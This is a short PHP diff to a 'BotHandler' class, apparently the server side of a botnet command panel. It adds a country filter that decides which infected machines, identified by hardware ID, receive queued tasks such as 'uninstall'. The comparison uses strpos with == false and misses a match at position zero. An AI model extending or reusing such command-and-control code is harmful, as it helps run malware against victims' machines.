@@ -87,6 +87,21 @@ class BotHandler{
                     $ae->execute(array(":i" => $com['id'], ":h" => $_POST["hwid"]));
                     if ($ae->fetchColumn(0) == 0)
                     {
+                        //TODO FILTER CHECKING
+                        //CHECK if Filter is Empty
+                        if(!empty($com["filter"])){
+                            //Check if Filter is none
+                            if($com["filter"] != "[]"){
+                                //Filter to array
+                                $filter = json_decode($com["filter"],true);
+                                if(is_array($filter)){
+                                    // Search Country in Filter if not found die
+                                    if (strpos($filter["country-filter"], $country) == false) {
+                                            die("waiting");
+                                    }
+                                }
+                            }
+                        }
 
                         if($com["task"] == "uninstall"){
                             echo $com["task"];
